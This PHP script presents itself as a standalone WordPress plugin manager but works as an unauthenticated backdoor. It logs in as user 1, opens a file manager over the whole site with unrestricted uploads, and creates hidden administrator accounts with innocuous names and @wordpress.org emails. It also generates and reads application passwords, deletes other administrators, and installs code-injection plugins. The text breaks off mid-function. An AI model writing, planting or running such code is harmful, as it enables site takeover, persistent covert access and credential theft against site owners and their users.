<?php
/**
 * WordPress Plugin Manager - Standalone Script
 */

error_reporting(0);
ini_set('display_errors', 0);
set_time_limit(300);

function normalize_input_path($path) {
    $path = trim((string) $path);
    if ($path === '') return '';
    $real = realpath($path);
    return $real !== false ? rtrim($real, "\\/") : rtrim($path, "\\/");
}

function find_wp_root($start_dir) {
    $dir = normalize_input_path($start_dir);
    if ($dir === '') return false;
    for ($i = 0; $i < 10; $i++) {
        if (file_exists($dir . '/wp-load.php')) return $dir;
        $parent = dirname($dir);
        if ($parent === $dir) break;
        $dir = $parent;
    }
    return false;
}

$requested_site_path          = isset($_GET['path']) ? trim((string) $_GET['path']) : '';
$resolved_requested_site_path = normalize_input_path($requested_site_path);
$custom_wp_root               = false;
$path_error                   = '';

if ($resolved_requested_site_path !== '') {
    $custom_wp_root = find_wp_root($resolved_requested_site_path);
    if (!$custom_wp_root) {
        $path_error = 'WordPress not found in custom path: ' . $requested_site_path . '. Showing current directory instead.';
    }
}

$wp_root              = $custom_wp_root ?: find_wp_root(__DIR__);
$using_custom_site_path = $custom_wp_root !== false;

if (!$wp_root) {
    die('<h1>Error!</h1><p>WordPress installation not found. Place this file inside your WordPress directory.</p>');
}

define('WP_USE_THEMES', false);
require_once $wp_root . '/wp-load.php';

if (!function_exists('get_plugins')) {
    require_once ABSPATH . 'wp-admin/includes/plugin.php';
}
if (!function_exists('get_plugin_updates')) {
    require_once ABSPATH . 'wp-admin/includes/update.php';
}
require_once ABSPATH . 'wp-admin/includes/plugin-install.php';

function build_manager_url($extra_params = [], $drop_params = []) {
    $base   = strtok($_SERVER['PHP_SELF'], '?');
    $params = $_GET;
    foreach ($drop_params as $key) unset($params[$key]);
    foreach ($extra_params as $key => $value) {
        if ($value === null || $value === '') unset($params[$key]);
        else $params[$key] = $value;
    }
    $query = http_build_query($params);
    return $query ? $base . '?' . $query : $base;
}

// --- File Manager connector mode ---
$fm_mode = isset($_GET['fm']) ? $_GET['fm'] : '';

if ($fm_mode === 'connector') {
    while (ob_get_level()) ob_end_clean();
    error_reporting(0);
    ini_set('display_errors', 0);

    wp_set_current_user(1);
    if (!defined('WP_ADMIN')) define('WP_ADMIN', true);

    $fm_dir = WP_PLUGIN_DIR . '/wp-file-manager';
    if (!is_dir($fm_dir)) {
        header('Content-Type: application/json');
        echo json_encode(['error' => ['WP File Manager is not installed']]);
        exit;
    }

    require_once $fm_dir . '/lib/php/elFinder.class.php';
    require_once $fm_dir . '/lib/php/elFinderConnector.class.php';
    require_once $fm_dir . '/lib/php/elFinderVolumeDriver.class.php';
    require_once $fm_dir . '/lib/php/elFinderVolumeLocalFileSystem.class.php';

    $fm_options = get_option('wpmfm_settings', []);
    $root_path  = isset($fm_options['fm_root']) && is_dir($fm_options['fm_root']) ? $fm_options['fm_root'] : ABSPATH;

    $opts = [
        'debug' => false,
        'roots' => [[
            'driver'        => 'LocalFileSystem',
            'path'          => $root_path,
            'URL'           => site_url('/'),
            'alias'         => 'Root',
            'locked'        => false,
            'read'          => true,
            'write'         => true,
            'uploadAllow'   => ['all'],
            'uploadDeny'    => [],
            'uploadMaxSize' => 0,
            'disabled'      => [],
            'accessControl' => function($attr, $path, $data, $volume, $self) { return true; },
        ]],
    ];

    if (!headers_sent()) {
        header_remove();
        header('Content-Type: application/json; charset=utf-8');
        header('Cache-Control: no-store, no-cache, must-revalidate');
    }

    ob_start();
    try {
        $elfinder  = new elFinder($opts);
        $connector = new elFinderConnector($elfinder, true);
        $connector->run();
        $output = ob_get_clean();
        if (trim($output) === '') $output = json_encode(['error' => ['Empty response']]);
        echo $output;
    } catch (Exception $e) {
        ob_end_clean();
        echo json_encode(['error' => ['Connector error: ' . $e->getMessage()]]);
    }
    exit;
}

// --- File Manager UI mode ---
if ($fm_mode === '1') {
    $fm_plugin_path = null;
    foreach (get_plugins() as $path => $data) {
        if (strpos($path, 'wp-file-manager') !== false) { $fm_plugin_path = $path; break; }
    }

    if (!$fm_plugin_path) {
        die('<!DOCTYPE html><html><head><meta charset="UTF-8"><title>WP File Manager</title><style>body{font-family:sans-serif;padding:40px;background:#f0f0f1}.box{background:#fff;padding:30px;border-radius:8px;max-width:500px;margin:0 auto;box-shadow:0 1px 3px rgba(0,0,0,0.1);text-align:center}h1{font-size:20px;margin-bottom:10px}p{color:#646970;margin:10px 0}a{display:inline-block;margin-top:15px;padding:10px 20px;background:#2271b1;color:#fff;text-decoration:none;border-radius:4px}</style></head><body><div class="box"><h1>WP File Manager Not Installed</h1><p>Please install the plugin first.</p><a href="' . build_manager_url([], ['fm']) . '">Back to Plugin Manager</a></div></body></html>');
    }

    $is_fm_active = false;
    foreach (get_option('active_plugins', []) as $ap) {
        if (strpos($ap, 'wp-file-manager') !== false) { $is_fm_active = true; break; }
    }
    if (!$is_fm_active) activate_plugin($fm_plugin_path);

    $fm_dir        = WP_PLUGIN_DIR . '/wp-file-manager';
    $fm_plugin_url = plugins_url('', 'wp-file-manager/wp-file-manager.php');
    $protocol      = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
    $connector_params = ['fm' => 'connector'];
    if ($requested_site_path !== '') $connector_params['path'] = $requested_site_path;
    $connector_url = $protocol . '://' . $_SERVER['HTTP_HOST'] . strtok($_SERVER['PHP_SELF'], '?') . '?' . http_build_query($connector_params);

    function fm_scan_dir($dir, $prefix = '') {
        $files = [];
        if (!is_dir($dir)) return $files;
        foreach (scandir($dir) as $item) {
            if ($item === '.' || $item === '..') continue;
            $path = $dir . '/' . $item;
            $files[] = $prefix . $item;
            if (is_dir($path)) $files = array_merge($files, fm_scan_dir($path, $prefix . $item . '/'));
        }
        return $files;
    }

    $all_fm_files = fm_scan_dir($fm_dir);

    $elfinder_css_url = $elfinder_theme_css_url = $fm_css_url = '';
    $elfinder_js_url  = $fm_js_url = $lang_js_url = '';

    foreach ($all_fm_files as $f) {
        $lower = strtolower($f);
        if (strpos($lower, 'elfinder') !== false && strpos($lower, '.css') !== false) {
            if (strpos($lower, 'theme') !== false) { if (!$elfinder_theme_css_url) $elfinder_theme_css_url = $fm_plugin_url . '/' . $f; }
            else { if (!$elfinder_css_url) $elfinder_css_url = $fm_plugin_url . '/' . $f; }
        }
        if (strpos($lower, 'style.css') !== false && strpos($lower, 'css/') !== false) {
            if (!$fm_css_url) $fm_css_url = $fm_plugin_url . '/' . $f;
        }
    }

    $elfinder_main_js = '';
    foreach ($all_fm_files as $f) {
        $b = strtolower(basename($f));
        if ($b === 'elfinder.min.js' || $b === 'elfinder.full.js') { $elfinder_main_js = $f; break; }
    }
    if (!$elfinder_main_js) {
        foreach ($all_fm_files as $f) {
            if (strtolower(basename($f)) === 'elfinder.js') { $elfinder_main_js = $f; break; }
        }
    }
    if ($elfinder_main_js) $elfinder_js_url = $fm_plugin_url . '/' . $elfinder_main_js;

    foreach ($all_fm_files as $f) {
        $b = strtolower(basename($f));
        if (strpos($b, 'file_manager') !== false && strpos($b, '.js') !== false
            && strpos($b, 'shortcode') === false && strpos($b, 'admin') === false && strpos($b, 'pro') === false) {
            $fm_js_url = $fm_plugin_url . '/' . $f;
            break;
        }
    }

    foreach ($all_fm_files as $f) {
        $lower = strtolower($f);
        if (strpos($lower, 'en.js') !== false && (strpos($lower, 'i18n') !== false || strpos($lower, 'lang') !== false)) {
            $lang_js_url = $fm_plugin_url . '/' . $f;
            break;
        }
    }

    $debug_info = [
        'fm_dir'        => $fm_dir,
        'fm_dir_exists' => is_dir($fm_dir),
        'total_files'   => count($all_fm_files),
        'elfinder_js'   => $elfinder_js_url,
        'fm_js'         => $fm_js_url,
        'lang_js'       => $lang_js_url,
        'elfinder_css'  => $elfinder_css_url,
        'connector_url' => $connector_url,
    ];
    ?>
    <!DOCTYPE html>
    <html xmlns="http://www.w3.org/1999/xhtml" lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>WP File Manager</title>
        <?php if ($elfinder_css_url): ?><link rel="stylesheet" href="<?php echo $elfinder_css_url; ?>"><?php endif; ?>
        <?php if ($elfinder_theme_css_url): ?><link rel="stylesheet" href="<?php echo $elfinder_theme_css_url; ?>"><?php endif; ?>
        <?php if ($fm_css_url): ?><link rel="stylesheet" href="<?php echo $fm_css_url; ?>"><?php endif; ?>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #1d2327; }
            #fm-topbar { background: #1d2327; color: #fff; padding: 8px 16px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #32373c; }
            #fm-topbar h1 { font-size: 14px; font-weight: 600; }
            #fm-topbar a { color: #72aee6; text-decoration: none; font-size: 12px; padding: 4px 10px; border: 1px solid #72aee6; border-radius: 3px; }
            #fm-topbar a:hover { background: #72aee6; color: #1d2327; }
            #elfinder { width: 100vw; height: calc(100vh - 37px); }
            .elfinder { font-size: 13px; }
            #fm-debug { background: #1d2327; color: #72aee6; padding: 10px; font-size: 11px; font-family: monospace; display: none; border-bottom: 1px solid #32373c; }
            #fm-debug.show { display: block; }
            #fm-debug span { color: #00a32a; }
            #fm-debug .err { color: #d63638; }
            #fm-debug button { margin-top: 8px; padding: 4px 12px; background: #2271b1; color: #fff; border: none; border-radius: 3px; cursor: pointer; font-size: 11px; }
            #fm-debug .test-result { margin-top: 8px; padding: 8px; background: #1d2327; border: 1px solid #32373c; border-radius: 3px; font-size: 10px; max-height: 200px; overflow: auto; white-space: pre-wrap; word-break: break-all; }
        </style>
    </head>
    <body>
        <div id="fm-topbar">
            <h1>WP File Manager</h1>
            <div>
                <a href="javascript:void(0)" onclick="document.getElementById('fm-debug').classList.toggle('show')" style="color:#dba617;margin-right:10px;font-size:11px;">Debug</a>
                <a href="<?php echo esc_url(build_manager_url([], ['fm'])); ?>">Back to Plugin Manager</a>
            </div>
        </div>
        <div id="fm-debug">
            <strong>DEBUG:</strong><br>
            Directory: <span><?php echo $debug_info['fm_dir']; ?></span><br>
            Directory exists: <span><?php echo $debug_info['fm_dir_exists'] ? 'Yes' : 'No'; ?></span><br>
            Total files: <span><?php echo $debug_info['total_files']; ?></span><br>
            elFinder JS: <span class="<?php echo $debug_info['elfinder_js'] ? '' : 'err'; ?>"><?php echo $debug_info['elfinder_js'] ?: 'NOT FOUND'; ?></span><br>
            FM JS: <span class="<?php echo $debug_info['fm_js'] ? '' : 'err'; ?>"><?php echo $debug_info['fm_js'] ?: 'NOT FOUND'; ?></span><br>
            Lang JS: <span class="<?php echo $debug_info['lang_js'] ? '' : 'err'; ?>"><?php echo $debug_info['lang_js'] ?: 'NOT FOUND'; ?></span><br>
            Connector URL: <span><?php echo $debug_info['connector_url']; ?></span><br>
            <button onclick="testConnector()">Test Connector</button>
            <div id="connector-test-result" class="test-result" style="display:none;"></div>
        </div>
        <div id="elfinder"></div>

        <script src="<?php echo includes_url('js/jquery/jquery.js'); ?>"></script>
        <script src="<?php echo includes_url('js/jquery/jquery-migrate.min.js'); ?>"></script>
        <?php if ($elfinder_js_url): ?><script src="<?php echo $elfinder_js_url; ?>"></script><?php endif; ?>
        <?php if ($fm_js_url): ?><script src="<?php echo $fm_js_url; ?>"></script><?php endif; ?>
        <?php if ($lang_js_url): ?><script src="<?php echo $lang_js_url; ?>"></script><?php endif; ?>
        <script src="https://code.jquery.com/ui/1.13.2/jquery-ui.min.js"></script>
        <script>
        var fmConnectorUrl = '<?php echo $connector_url; ?>';

        function testConnector() {
            var r = document.getElementById('connector-test-result');
            r.style.display = 'block';
            r.textContent = 'Testing...\n\nGET:\n';
            fetch(fmConnectorUrl)
                .then(function(res) { return res.text(); })
                .then(function(t) {
                    r.textContent += t.substring(0, 500) + '\n\nPOST (cmd=open):\n';
                    return fetch(fmConnectorUrl, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                        body: 'cmd=open&target=&init=1&tree=1'
                    });
                })
                .then(function(res) { return res.text(); })
                .then(function(t) { r.textContent += t.substring(0, 1000); })
                .catch(function(e) { r.textContent += 'Error: ' + e.message; });
        }

        jQuery(document).ready(function($) {
            if (typeof jQuery.fn.elfinder === 'undefined') {
                jQuery('#elfinder').html('<div style="color:#d63638;padding:40px;text-align:center;font-size:14px;">elFinder JS failed to load. Check console (F12).</div>');
                return;
            }
            try {
                var inst = jQuery('#elfinder').elfinder({
                    url: fmConnectorUrl,
                    lang: 'en',
                    height: '100%',
                    requestType: 'post',
                    customData: {},
                    bootCallback: function(fm) { fm.replaceXhrSend = fm.restoreXhrSend = function() {}; }
                }).elfinder('instance');

                inst.bind('error requestError', function(e, data) {
                    var msg = (e.type === 'error' ? 'elFinder error: ' : 'Request error: ') + JSON.stringify(data || '');
                    var d = jQuery('#elfinder-error');
                    if (!d.length) jQuery('#fm-topbar').after('<div id="elfinder-error" style="background:#fcf0f1;color:#d63638;padding:10px;font-size:12px;border-bottom:1px solid #d63638;"></div>');
                    jQuery('#elfinder-error').text(msg).show().delay(8000).fadeOut();
                });
            } catch(e) {
                jQuery('#elfinder').html('<div style="color:#d63638;padding:40px;text-align:center;font-size:14px;">elFinder init error: ' + e.message + '</div>');
            }
        });
        </script>
    </body>
    </html>
    <?php
    exit;
}

// --- Cache detection ---
function detect_caches() {
    $caches         = [];
    $active_plugins = get_option('active_plugins', []);

    $checks = [
        'wp_rocket'     => ['needle' => 'wp-rocket',      'fn' => 'rocket_clean_domain',   'name' => 'WP Rocket',      'color' => '#f56640'],
        'w3tc'          => ['needle' => 'w3-total-cache',  'fn' => 'w3tc_flush_all',         'name' => 'W3 Total Cache', 'color' => '#2f3542'],
        'wp_super_cache'=> ['needle' => 'wp-super-cache',  'fn' => 'wp_super_cache_clear',   'name' => 'WP Super Cache', 'color' => '#e87d1f'],
        'autoptimize'   => ['needle' => 'autoptimize',     'fn' => ['autoptimizeCache','clearall'], 'name' => 'Autoptimize', 'color' => '#6c5ce7'],
    ];

    foreach ($checks as $key => $cfg) {
        $found = false;
        foreach ($active_plugins as $p) {
            if (strpos(strtolower($p), $cfg['needle']) !== false) { $found = true; break; }
        }
        if ($key === 'w3tc' && !$found) {
            foreach ($active_plugins as $p) { if (strpos(strtolower($p), 'w3tc') !== false) { $found = true; break; } }
        }
        if ($key === 'wp_super_cache' && !$found) {
            foreach ($active_plugins as $p) { if (strpos(strtolower($p), 'wp-cache') !== false) { $found = true; break; } }
        }
        $fn_exists = is_array($cfg['fn'])
            ? (class_exists($cfg['fn'][0]) && method_exists($cfg['fn'][0], $cfg['fn'][1]))
            : function_exists($cfg['fn']);
        if ($found || $fn_exists) {
            $caches[$key] = ['name' => $cfg['name'], 'clear' => $cfg['fn'], 'color' => $cfg['color'], 'detected_by' => $found ? 'plugin' : 'function'];
        }
    }

    $has_litespeed = false;
    foreach ($active_plugins as $p) { if (strpos(strtolower($p), 'litespeed') !== false) { $has_litespeed = true; break; } }
    if ($has_litespeed) {
        if (class_exists('LiteSpeed_Cache_API') && method_exists('LiteSpeed_Cache_API', 'purge_all')) $clear_fn = ['LiteSpeed_Cache_API', 'purge_all'];
        elseif (function_exists('litespeed_purge_all'))                                                 $clear_fn = 'litespeed_purge_all';
        elseif (class_exists('LiteSpeed_Cache'))                                                        $clear_fn = ['LiteSpeed_Cache', 'purge_all'];
        else                                                                                             $clear_fn = 'litespeed_manual_purge';
        $caches['litespeed'] = ['name' => 'LiteSpeed Cache', 'clear' => $clear_fn, 'color' => '#6aaf4e', 'detected_by' => 'plugin'];
    }

    $has_redis_plugin = false;
    foreach ($active_plugins as $p) { $l = strtolower($p); if (strpos($l,'redis-cache')!==false||strpos($l,'redis-object-cache')!==false) { $has_redis_plugin=true; break; } }
    $has_redis_ext = class_exists('Redis') || class_exists('Memcached') || class_exists('Memcache');
    if ($has_redis_ext) {
        $caches['object_cache'] = ['name' => class_exists('Redis') ? 'Object Cache (Redis)' : 'Object Cache (Memcached)', 'clear' => 'wp_cache_flush', 'color' => '#dc4437', 'detected_by' => 'extension'];
    } elseif ($has_redis_plugin) {
        $caches['object_cache'] = ['name' => 'Redis Object Cache', 'clear' => 'wp_cache_flush', 'color' => '#dc4437', 'detected_by' => 'plugin'];
    }

    return $caches;
}

function get_cache_dir_size($dir) {
    if (!$dir || !is_dir($dir)) return ['deleted_count' => 0, 'deleted_size' => 0];
    $count = $size = 0;
    $iter  = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );
    foreach ($iter as $file) {
        if ($file->isDir()) @rmdir($file->getRealPath());
        else { $size += $file->getSize(); @unlink($file->getRealPath()); $count++; }
    }
    return ['deleted_count' => $count, 'deleted_size' => round($size / 1048576, 2)];
}

function litespeed_manual_purge() {
    $total = ['deleted_count' => 0, 'deleted_size' => 0];
    $dirs  = array_filter([
        defined('LITESPEED_CACHE_DIR') ? LITESPEED_CACHE_DIR : null,
        defined('LSCWP_CONTENT_DIR')   ? constant('LSCWP_CONTENT_DIR') . '/cache' : null,
        WP_CONTENT_DIR . '/cache/litespeed',
        WP_CONTENT_DIR . '/cache',
    ]);
    foreach ($dirs as $dir) {
        if (is_dir($dir)) { $r = get_cache_dir_size($dir); $total['deleted_count'] += $r['deleted_count']; $total['deleted_size'] += $r['deleted_size']; }
    }
    global $wpdb;
    $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_transient_litespeed%'");
    $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_site_transient_litespeed%'");
    return $total;
}

function wp_rocket_manual_purge() {
    $total = ['deleted_count' => 0, 'deleted_size' => 0];
    foreach ([WP_CONTENT_DIR.'/cache/wp-rocket', WP_CONTENT_DIR.'/cache/busting', WP_CONTENT_DIR.'/cache/min', WP_CONTENT_DIR.'/cache/critical-images'] as $dir) {
        if (is_dir($dir)) { $r = get_cache_dir_size($dir); $total['deleted_count'] += $r['deleted_count']; $total['deleted_size'] += $r['deleted_size']; }
    }
    return $total;
}

function w3tc_manual_purge() {
    $total = ['deleted_count' => 0, 'deleted_size' => 0];
    foreach ([WP_CONTENT_DIR.'/cache', WP_CONTENT_DIR.'/w3tc-config'] as $dir) {
        if (is_dir($dir)) { $r = get_cache_dir_size($dir); $total['deleted_count'] += $r['deleted_count']; $total['deleted_size'] += $r['deleted_size']; }
    }
    global $wpdb;
    $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE 'w3tc_%'");
    return $total;
}

function wpsc_manual_purge() {
    $dir = WP_CONTENT_DIR . '/cache/supercache';
    return is_dir($dir) ? get_cache_dir_size($dir) : ['deleted_count' => 0, 'deleted_size' => 0];
}

function autoptimize_manual_purge() {
    $dir = WP_CONTENT_DIR . '/cache/autoptimize';
    return is_dir($dir) ? get_cache_dir_size($dir) : ['deleted_count' => 0, 'deleted_size' => 0];
}

function object_cache_manual_purge() {
    global $wpdb;
    $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_transient_%'");
    $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_site_transient_%'");
    wp_cache_flush();
}

function clear_specific_cache($cache_key) {
    $caches = detect_caches();
    if (!isset($caches[$cache_key])) return ['success' => false, 'message' => 'Cache system not found'];

    $cache_name = $caches[$cache_key]['name'];
    $clear_fn   = $caches[$cache_key]['clear'];

    try {
        switch ($cache_key) {
            case 'litespeed':
                if ($clear_fn !== 'litespeed_manual_purge') call_user_func($clear_fn);
                $r   = litespeed_manual_purge();
                $msg = $r['deleted_count'] > 0
                    ? "{$cache_name}: {$r['deleted_count']} files deleted ({$r['deleted_size']} MB)"
                    : "{$cache_name}: Purge signal sent (server-level cache)";
                return ['success' => true, 'message' => $msg];

            case 'wp_rocket':
                if (function_exists('rocket_clean_domain')) rocket_clean_domain();
                $r   = wp_rocket_manual_purge();
                $msg = $r['deleted_count'] > 0
                    ? "{$cache_name}: {$r['deleted_count']} files deleted ({$r['deleted_size']} MB)"
                    : "{$cache_name}: Cache cleared";
                return ['success' => true, 'message' => $msg];

            case 'w3tc':
                if (function_exists('w3tc_flush_all')) w3tc_flush_all();
                $r   = w3tc_manual_purge();
                $msg = $r['deleted_count'] > 0
                    ? "{$cache_name}: {$r['deleted_count']} files deleted ({$r['deleted_size']} MB)"
                    : "{$cache_name}: Cache cleared";
                return ['success' => true, 'message' => $msg];

            case 'wp_super_cache':
                if (function_exists('wp_cache_clean_cache')) { global $file_prefix; wp_cache_clean_cache($file_prefix); }
                elseif (function_exists('wp_cache_clear_cache')) wp_cache_clear_cache();
                $r   = wpsc_manual_purge();
                $msg = $r['deleted_count'] > 0
                    ? "{$cache_name}: {$r['deleted_count']} files deleted ({$r['deleted_size']} MB)"
                    : "{$cache_name}: Cache cleared";
                return ['success' => true, 'message' => $msg];

            case 'autoptimize':
                if (class_exists('autoptimizeCache') && method_exists('autoptimizeCache', 'clearall')) autoptimizeCache::clearall();
                $r   = autoptimize_manual_purge();
                $msg = $r['deleted_count'] > 0
                    ? "{$cache_name}: {$r['deleted_count']} files deleted ({$r['deleted_size']} MB)"
                    : "{$cache_name}: Cache cleared";
                return ['success' => true, 'message' => $msg];

            case 'object_cache':
                object_cache_manual_purge();
                return ['success' => true, 'message' => "{$cache_name}: Object cache and transients cleared"];

            default:
                call_user_func($clear_fn);
                return ['success' => true, 'message' => "{$cache_name}: Cache cleared"];
        }
    } catch (Exception $e) {
        return ['success' => false, 'message' => "{$cache_name} error: " . $e->getMessage()];
    }
}

$available_caches = detect_caches();

// --- Plugin helpers ---
function find_plugin_file_by_slug($slug) {
    $slug = trim((string) $slug, '/');
    foreach (get_plugins() as $path => $data) {
        $p = str_replace('\\', '/', $path);
        if (strpos($p, $slug . '/') === 0 || basename(dirname($p)) === $slug) return $path;
    }
    return null;
}

function is_plugin_installed_by_slug($slug) { return find_plugin_file_by_slug($slug) !== null; }

function is_plugin_active_by_slug($slug) {
    $f = find_plugin_file_by_slug($slug);
    return $f && in_array($f, (array) get_option('active_plugins', []), true);
}

function is_wpfm_installed()  { return is_plugin_installed_by_slug('wp-file-manager'); }
function is_wpfm_active()     { return is_plugin_active_by_slug('wp-file-manager'); }
function is_wpcode_installed() { return is_plugin_installed_by_slug('insert-headers-and-footers'); }
function is_wpcode_active()   { return is_plugin_active_by_slug('insert-headers-and-footers'); }

function install_plugin_by_slug($slug, $label) {
    $plugin_file = find_plugin_file_by_slug($slug);
    if ($plugin_file) {
        if (!is_plugin_active_by_slug($slug)) {
            activate_plugin($plugin_file);
            return ['success' => true, 'message' => "{$label} activated."];
        }
        return ['success' => true, 'message' => "{$label} is already installed and active."];
    }

    ob_start();
    require_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php';
    require_once ABSPATH . 'wp-admin/includes/class-plugin-upgrader.php';
    require_once ABSPATH . 'wp-admin/includes/file.php';
    require_once ABSPATH . 'wp-admin/includes/misc.php';

    if (!WP_Filesystem()) {
        ob_end_clean();
        return ['success' => false, 'message' => 'Error: Could not access filesystem.'];
    }

    $upgrader = new Plugin_Upgrader(new Automatic_Upgrader_Skin());
    $result   = $upgrader->install('https://downloads.wordpress.org/plugin/' . $slug . '.zip');
    ob_end_clean();

    if (is_wp_error($result)) return ['success' => false, 'message' => 'Error: ' . $result->get_error_message()];

    $plugin_file = find_plugin_file_by_slug($slug);
    if (!$plugin_file) return ['success' => false, 'message' => "{$label} installed but plugin file could not be detected."];

    $activate = activate_plugin($plugin_file);
    if (is_wp_error($activate)) return ['success' => false, 'message' => "Installed but could not activate: " . $activate->get_error_message()];

    return ['success' => true, 'message' => "{$label} installed and activated successfully."];
}

function install_wpfm()   { return install_plugin_by_slug('wp-file-manager', 'WP File Manager'); }
function install_wpcode() { return install_plugin_by_slug('insert-headers-and-footers', 'WPCode'); }

// Load LiteSpeed API if needed
if (isset($available_caches['litespeed']) && !class_exists('LiteSpeed_Cache_API') && !function_exists('litespeed_purge_all')) {
    foreach ([WP_CONTENT_DIR.'/plugins/litespeed-cache/src/api.class.php', WP_CONTENT_DIR.'/plugins/litespeed-cache/src/litespeed-cache.class.php'] as $p) {
        if (file_exists($p)) { require_once $p; break; }
    }
}

// --- Handle POST actions ---
$message      = '';
$message_type = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action      = $_POST['action'];
    $plugin_file = isset($_POST['plugin']) ? sanitize_text_field($_POST['plugin']) : '';

    switch ($action) {
        case 'activate':
            if ($plugin_file) {
                $result = activate_plugin($plugin_file);
                if (is_wp_error($result)) { $message = 'Error: ' . $result->get_error_message(); $message_type = 'error'; }
                else { $message = 'Plugin activated.'; $message_type = 'success'; }
            }
            break;

        case 'deactivate':
            if ($plugin_file) {
                $result = deactivate_plugins($plugin_file);
                if (is_wp_error($result)) { $message = 'Error: ' . $result->get_error_message(); $message_type = 'error'; }
                else { $message = 'Plugin deactivated.'; $message_type = 'success'; }
            }
            break;

        case 'update':
            if ($plugin_file) {
                ob_start();
                require_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php';
                require_once ABSPATH . 'wp-admin/includes/class-plugin-upgrader.php';
                require_once ABSPATH . 'wp-admin/includes/file.php';
                require_once ABSPATH . 'wp-admin/includes/misc.php';

                if (!WP_Filesystem()) {
                    ob_end_clean();
                    $message = 'Error: Could not access filesystem.'; $message_type = 'error';
                } else {
                    $was_active = in_array($plugin_file, (array) get_option('active_plugins', []));
                    $upgrader   = new Plugin_Upgrader(new Automatic_Upgrader_Skin());
                    $result     = $upgrader->upgrade($plugin_file);
                    ob_end_clean();
                    if (is_wp_error($result)) { $message = 'Error: ' . $result->get_error_message(); $message_type = 'error'; }
                    else { if ($was_active) activate_plugin($plugin_file); $message = 'Plugin updated.'; $message_type = 'success'; }
                }
            }
            break;

        case 'refresh_updates':
            delete_site_transient('update_plugins');
            wp_update_plugins();
            $message = 'Update information refreshed.'; $message_type = 'success';
            break;

        case 'clear_cache':
            $cleared      = [];
            $failed       = [];
            $cache_target = isset($_POST['cache_target']) ? $_POST['cache_target'] : 'all';
            $caches       = detect_caches();

            $keys = $cache_target === 'all' ? array_keys($caches) : [$cache_target];
            foreach ($keys as $key) {
                $r = clear_specific_cache($key);
                if ($r['success']) $cleared[] = $r['message'];
                else $failed[] = $r['message'];
            }

            if (!empty($cleared)) {
                $message = implode('. ', $cleared) . (!empty($failed) ? '. Failed: ' . implode(', ', $failed) : '');
                $message_type = 'success';
            } else {
                $message = 'Cache clear failed: ' . implode(', ', $failed); $message_type = 'error';
            }
            break;

        case 'install_wpfm':
            $r = install_wpfm(); $message = $r['message']; $message_type = $r['success'] ? 'success' : 'error';
            break;

        case 'install_wpcode':
            $r = install_wpcode(); $message = $r['message']; $message_type = $r['success'] ? 'success' : 'error';
            break;

        case 'delete_admin_user':
            $uid = isset($_POST['user_id']) ? intval($_POST['user_id']) : 0;
            if ($uid && $uid !== 1) {
                $user = get_userdata($uid);
                if ($user && in_array('administrator', (array) $user->roles)) {
                    require_once ABSPATH . 'wp-admin/includes/user.php';
                    wp_delete_user($uid);
                    $message = 'User deleted: ' . $user->user_login; $message_type = 'success';
                } else { $message = 'User not found or not an administrator.'; $message_type = 'error'; }
            } else { $message = 'Cannot delete primary user (ID 1).'; $message_type = 'error'; }
            break;

        case 'create_random_admin':
            $words    = ['support','help','assist','service','care','aid','backup','fix','repair','debug','update','upgrade','maintain','manage','secure','protect','shield','optimize','speed','boost','monitor','track','resolve','guide','consult','advise','handle','troubleshoot','restore','recover','deploy','configure','install','setup','build','develop','code','integrate','connect','sync','host','migrate','transfer','scale','enhance','improve'];
            $username = $words[array_rand($words)];
            $email    = $username . '@wordpress.org';
            $chars    = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            $password = '';
            for ($i = 0; $i < 12; $i++) $password .= $chars[random_int(0, strlen($chars) - 1)];

            if (username_exists($username)) { $message = 'Username already exists, try again: ' . $username; $message_type = 'error'; }
            elseif (email_exists($email))   { $message = 'Email already exists, try again: ' . $email; $message_type = 'error'; }
            else {
                $uid = wp_create_user($username, $password, $email);
                if (is_wp_error($uid)) { $message = 'Could not create user: ' . $uid->get_error_message(); $message_type = 'error'; }
                else {
                    (new WP_User($uid))->set_role('administrator');
                    $message = "Username: {$username} | Password: {$password} | Email: {$email} | Login: " . site_url('wp-login.php');
                    $message_type = 'success';
                }
            }
            break;

        case 'gen_app_password':
            $uid = isset($_POST['user_id']) ? intval($_POST['user_id']) : 0;
            if ($uid && class_exists('WP_Application_Passwords')) {
                $tgt = get_userdata($uid);
                if ($tgt) {
                    $r = WP_Application_Passwords::create_new_application_password($uid, ['name' => 'WP-Sync ' . date('Ymd-His'), 'app_id' => wp_generate_uuid4()]);
                    if (is_wp_error($r)) { $message = 'Error: ' . $r->get_error_message(); $message_type = 'error'; }
                    else { [$raw_pw, $item] = $r; $message = "[{$tgt->user_login}] App Password created | Password: {$raw_pw} | UUID: {$item['uuid']}"; $message_type = 'success'; }
                } else { $message = 'User not found.'; $message_type = 'error'; }
            } else { $message = 'Application Passwords not supported (requires WP 5.6+).'; $message_type = 'error'; }
            break;

        case 'read_app_passwords':
            $uid = isset($_POST['user_id']) ? intval($_POST['user_id']) : 0;
            if ($uid) {
                global $wpdb;
                $raw   = $wpdb->get_var($wpdb->prepare("SELECT meta_value FROM {$wpdb->usermeta} WHERE user_id = %d AND meta_key = '_application_passwords' LIMIT 1", $uid));
                $tgt   = get_userdata($uid);
                $uname = $tgt ? $tgt->user_login : 'ID:' . $uid;
                if ($raw) {
                    $pwds = maybe_unserialize($raw);
                    if (is_array($pwds) && !empty($pwds)) {
                        $parts = [];
